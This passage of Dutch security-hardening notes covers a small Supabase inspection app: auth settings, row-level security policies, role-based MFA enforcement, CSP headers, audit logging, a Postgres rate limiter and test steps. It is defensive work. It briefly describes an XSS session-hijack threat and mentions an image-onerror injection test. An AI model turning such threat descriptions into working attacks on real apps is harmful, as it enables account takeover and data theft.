Supabase Auth regelt: bcrypt-hashing van wachtwoorden, JWT’s, refresh-tokenrotatie, e-maillinks, TOTP-MFA, rate limits en reset-tokens. Hosting regelt TLS. **Niet** standaard: open registratie uitzetten, RLS-policies, rolkoppeling, MFA-afdwinging per rol, CSP/headers, per-rol sessieduur, custom SMTP. Ook moet je zelf voorkomen dat `service_role` in de browser komt.

## 3) Exacte maatregelen

**Auth-instellingen (Supabase Dashboard):**
- Auth → Providers → Email: **“Allow new users to sign up” uit**. Gebruik alleen invites.
- Auth → Sessions: JWT expiry **3600s**, refresh token expiry **8–12u**, time-box sessie **7d**, inactivity **8u**. Per-rol sessieduur kan niet native; gebruik globaal 8u en dwing voor Hoofd MFA af.
- Auth → Email: OTP/recovery expiry **900s** (resetlinks verlopen dan na 15 min; eenmalig bruikbaar).
- Password strength: min **12 tekens**, leaked-password protection aan indien beschikbaar; geen verplichte rotatie.
- MFA: TOTP aan. Custom SMTP instellen; redirect-URL’s whitelisten.

**Profiel→rol en RLS:**
```sql
create table public.profiles (
  id uuid primary key references auth.users(id) on delete cascade,
  role text not null default 'inspecteur'
    check (role in ('hoofd','coordinator','inspecteur')),
  full_name text
);
alter table public.profiles enable row level security;

create or replace function public.current_role()
returns text language sql stable security definer set search_path = public as $$
  select role from public.profiles where id = auth.uid()
$$;

create policy profiles_select on public.profiles
for select using (id = auth.uid() or public.current_role() in ('hoofd','coordinator'));

revoke update on public.profiles from authenticated;
grant update (full_name) on public.profiles to authenticated;
create policy profiles_update_own on public.profiles
for update using (id = auth.uid()) with check (id = auth.uid());
```
Rol wijzigen alleen via `service_role`/Edge Function. Nieuwe gebruiker:
```sql
create function public.handle_new_user() returns trigger
language plpgsql security definer set search_path=public as $$
begin
  insert into public.profiles(id, full_name)
  values (new.id, new.raw_user_meta_data->>'full_name');
  return new;
end $$;
create trigger on_auth_user_created after insert on auth.users
for each row execute function public.handle_new_user();
```

**MFA voor Hoofd afdwingen** (app + RLS):
```sql
create or replace function public.aal_ok_for_role()
returns boolean language sql stable as $$
  select public.current_role() <> 'hoofd'
      or auth.jwt()->>'aal' = 'aal2'
$$;
```
Gebruik `public.aal_ok_for_role()` in policies op inspecties/foto’s/planning. In JS:
```js
const { data: aal } = await supabase.auth.mfa.getAuthenticatorAssuranceLevel();
if (role === 'hoofd' && aal.currentLevel !== 'aal2') {
  if (aal.nextLevel === 'aal2') {
    const { data: ch } = await supabase.auth.mfa.challenge({ factorId });
    await supabase.auth.mfa.verify({ factorId, challengeId: ch.id, code });
  } else {
    const { data } = await supabase.auth.mfa.enroll({ factorType: 'totp' });
    // toon data.totp.qr_code
  }
}
```

**Inloggen/uitloggen:**
```js
await supabase.auth.signInWithPassword({ email, password });

await supabase.auth.signInWithOtp({
  email,
  options: { shouldCreateUser: false, emailRedirectTo: location.origin + '/auth/callback' }
});

await supabase.auth.signOut({ scope: 'global' }); // alle apparaten
```
Het oude access token blijft tot JWT-expiry geldig; daarom JWT op 1u.

**Invite alleen via Edge Function** (service_role nooit in browser):
```ts
// na controle: caller is hoofd/coordinator
await admin.auth.admin.inviteUserByEmail(email, {
  redirectTo: 'https://app.example.nl/welkom'
});
```

**CSP/headers** (`_headers` voor Netlify/Cloudflare Pages; Vercel: `vercel.json`):
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://<project>.supabase.co; connect-src 'self' https://<project>.supabase.co wss://<project>.supabase.co; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
```
Verwijder inline `onclick`:
```html
<button data-action="save">Opslaan</button>
<script>
document.addEventListener('click', e => {
  const b = e.target.closest('[data-action]');
  if (b?.dataset.action === 'save') save();
});
</script>
```
Self-host `supabase-js` of voeg de CDN-host toe aan `script-src`.

## 4) Testen
- Direct `signUp()` → moet falen; invite werkt wel.
- Inspecteur leest andermans profiel/rol wijzigen → RLS deny.
- Hoofd zonder TOTP → gevoelige queries deny; na TOTP `aal2` → allow.
- `signOut({scope:'global'})` → tweede browser kan na refresh niet meer.
- Resetlink: na 15 min en na eenmalig gebruik → fout.
- DevTools: geen CSP-violations; `<img onerror>`-test geblokkeerd.
- `curl -I` op site: CSP/HSTS aanwezig.

## 5) Niet van toepassing/overbodig
Social login, SAML/SSO en eigen JWT-implementatie zijn overkill voor ~5 gebruikers. Eigen bcrypt-hashing is fout: Supabase doet dit al. Wachtwoordrotatie is niet nodig. CAPTCHA is bij invite-only meestal overbodig; rate limits volstaan. Per-rol resetlink-expiry kan niet; het is globaal. MFA voor iedereen is niet nodig; Hoofd verplicht, anderen optioneel.

===== 07-rate-limit-monitoring =====
# Rate limiting & monitoring voor de Werkplekinspectie-app

## 1. Risico voor déze app

De app heeft ~5 gebruikers, dus klassieke volumetrische DDoS is onrealistisch. Het reële risico zit elders:

- **Credential stuffing / brute force** op Supabase Auth. Eén gecompromitteerd inspecteursaccount geeft toegang tot foto's van personen, namen van monteurs en planning — direct AVG-plichtig datalek.
- **Misbruik van een geldige sessie**: massaal exporteren of verwijderen van inspecties. Dit kan een kwaadwillende insider zijn, maar ook een XSS-aanval. Je CSP staat `unsafe-inline` toe en de UI gebruikt inline `onclick` — één injected script kan de sessie kapen en via de REST-API alles exfiltreren. Monitoring is dan je enige detectie.
- **Ongecontroleerde RPC/Edge Function**: als je later exports of bulkacties via RPC doet, is er geen ingebouwde limiet.

Bij 5 gebruikers is een baseline klein en dus juist goed te bewaken: elke afwijking is signaal.

## 2. Wat Supabase/hosting al regelt (en niet)

**Wel:**
- Auth rate limits per IP en per e-mailadres (dashboard → Authentication → Rate Limits), inclusief e-mailverzending.
- CAPTCHA-verificatie (hCaptcha/Turnstile) op signup, login en password reset.
- Auth-logs, Postgres-logs, API-gateway-logs en Edge Function-logs. Retentie: Free 1 dag, Pro 7 dagen.
- Log Drains (Pro+) naar S3/Datadog/HTTP.
- Hosting (Netlify/Vercel/CF Pages) doet basale bot/DDoS-filtering op de statische site.

**Niet:**
- Geen rate limiting op PostgREST-queries per gebruiker.
- Geen ingebouwde security-alerts of anomaliedetectie.
- Geen account-lockout na N mislukte pogingen (alleen IP/e-mail throttling).
- Geen audit trail op deletes/exports — dat moet je zelf bouwen.

## 3. Concrete maatregelen

**Auth-instellingen (dashboard):** CAPTCHA aan met Turnstile; sign-in limiet bijv. 30 per 5 min per IP; e-mail 2/uur. Zet **MFA (TOTP)** aan en verplicht dit voor `hoofd` en `coordinator`.

**JS — captchaToken meegeven:**
```js
const { error } = await supabase.auth.signInWithPassword({
  email, password,
  options: { captchaToken: turnstileToken }
});
```

**security_events-tabel + RLS:**
```sql
create table public.security_events (
  id bigint generated always as identity primary key,
  created_at timestamptz not null default now(),
  actor uuid references auth.users(id),
  event_type text not null,
  severity text not null default 'info'
    check (severity in ('info','warn','critical')),
  detail jsonb not null default '{}'::jsonb
);
alter table public.security_events enable row level security;

create policy "hoofd leest" on public.security_events
  for select using ((auth.jwt()->'app_metadata'->>'role') = 'hoofd');

revoke insert on public.security_events from anon, authenticated;

create or replace function public.log_security_event(
  p_type text, p_sev text, p_detail jsonb default '{}')
returns void language plpgsql security definer set search_path=public as $$
begin
  insert into security_events(actor,event_type,severity,detail)
  values (auth.uid(), p_type, p_sev, p_detail);
end $$;
grant execute on function public.log_security_event to authenticated;
```

**Audit-trigger op deletes:**
```sql
create or replace function public.audit_delete() returns trigger
language plpgsql security definer set search_path=public as $$
begin
  perform log_security_event('delete_'||tg_table_name,'warn',
    jsonb_build_object('old', to_jsonb(old)));
  return old;
end $$;

create trigger trg_audit_inspecties_del after delete on public.inspecties
  for each row execute function public.audit_delete();
```

**Rate limit op RPC (Postgres-based, prima voor 5 users):**
```sql
create table public.rate_limits(
  key text primary key, window_start timestamptz not null, count int not null default 0);
alter table public.rate_limits enable row level security; -- geen policies

create or replace function public.check_rate_limit(
  p_key text, p_max int, p_window interval)
returns boolean language plpgsql security definer set search_path=public as $$
declare v int;
begin
  insert into rate_limits(key,window_start,count) values (p_key,now(),1)
  on conflict (key) do update set
    count = case when rate_limits.window_start < now()-p_window
                 then 1 else rate_limits.count+1 end,
    window_start = case when rate_limits.window_start < now()-p_window
                        then now() else rate_limits.window_start end
  returning count into v;
  if v > p_max then
    perform log_security_event('rate_limit_hit','warn',
      jsonb_build_object('key',p_key));
    return false;
  end if;
  return true;
end $$;
```
Gebruik in elke export-/bulk-RPC:
```sql
if not check_rate_limit('export:'||auth.uid(), 5, interval '1 hour') then
  raise exception 'rate limit';
end if;
perform log_security_event('export_inspecties','warn','{}'::jsonb);
```

**CSP/headers (`_headers` op Netlify):**
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https://<proj>.supabase.co; connect-src 'self' https://<proj>.supabase.co wss://<proj>.supabase.co; frame-ancestors 'none'; base-uri 'self'
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
```
Dit vereist eerst refactor van `onclick` → `addEventListener`, anders breekt de UI. Zonder deze stap blijft XSS het grootste monitorings-omzeilende risico.

**Alerts:** Supabase heeft geen native security-alerts. Twee opties:
- **Log Drain** naar Better Stack/Datadog met alert-regels op `event_type like 'delete_%'`, `rate_limit_hit`, `severity='critical'`.
- **pg_cron + Edge Function** die elke 15 min `security_events` met severity `critical` naar een webhook (Slack/Resend) post.

## 4. Testen

- 6× fout wachtwoord vanaf één IP → verwacht 429 of captcha-uitdaging.
- Login zonder `captchaToken` → fout.
- Als `inspecteur`: `select * from security_events` → leeg/geweigerd; directe insert → geweigerd; via `log_security_event` → rij verschijnt.
- Verwijder een inspectie → rij in `security_events` met `delete_inspecties`.
- Roep export-RPC 6× aan → 6e faalt en logt `rate_limit_hit`.
- Controleer of Log Drain events doorstuurt; forceer alert door handmatig een `critical`-event te inserten en de cron te triggeren.

## 5. Niet van toepassing / overbodig

- **WAF/bot-management**: 5 gebruikers, statische hosting, Supabase-gateway dekt basis.
- **Per-request rate limiting op alle PostgREST-calls**: RLS + kleine gebruikersgroep volstaat; limiteer alleen exports/deletes.
- **ML-anomaliedetectie**: te weinig data, te duur.
- **IP-allowlisting/mTLS**: inspecteurs werken mobiel op wisselende netwerken — onbruikbaar.
- **CAPTCHA op elke API-call**: alleen op auth-flows; op gewone CRUD irriteert het en voegt niets toe.

Eerlijk punt: CAPTCHA stopt geen credential stuffing met geldige wachtwoorden. MFA voor hoofd/coordinator is daarom belangrijker dan de captcha zelf.
